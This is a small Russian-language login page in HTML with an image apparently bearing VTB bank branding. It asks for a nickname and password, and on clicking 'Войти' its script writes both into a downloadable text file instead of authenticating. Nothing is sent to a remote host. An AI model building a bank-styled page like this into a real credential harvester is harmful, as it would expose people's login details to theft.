<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title><?=$website_title?></title>
  <link rel="stylesheet"
  href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <link rel="icon" href="/img/iconca.ico">
  <link rel="stylesheet"href="/css/main.css">
</head>
  <body>

<img  src="/img/vtb-log.png"  width="800" height="800">

<form id="form_enter">
    <h4>Вход</h4>
<p>
  <label for="username"> Введите ваш Ник </label>
  <input type="text" name="username" id="username" class="form-control">

  <form class="my-form">
      <div class="form-group">
          <label for="password"> Пароль </label>
          <input type="password" name="password" id="password" class="form-control">
      </div>
      <div class="form-group">
          <a href="#" onclick="return false" id="s-h-pass">Показать пароль</a>
      </div>
  </form>

  <div class="alert alert-danger mt-2" id="errorBlock2"> </div>

  <button type="button" id="enter_user"  class="btn btn-success mt-2">
    Войти
  </button>
</p>
</form>


<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>

  <script>
      $( document ).ready(function() {
          $('#s-h-pass').click(function(){
              var type = $('#password').attr('type') == "text" ? "password" : 'text',
               c = $(this).text() == "Скрыть пароль" ? "Показать пароль" : "Скрыть пароль";
              $(this).text(c);
              $('#password').prop('type', type);
          });
      });
  </script>


<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>

<script>

$('#enter_user').click(function () {
  var nick = $('#username').val();
  var pass = $('#password').val();
  var text = '['+nick+','+pass+']';
  document.write( '<a href="data:text/plain;charset=utf-8,%EF%BB%BF' + encodeURIComponent(text) + '" download="text.txt">text.txt</a>');

});
</script>


</body>
</html>
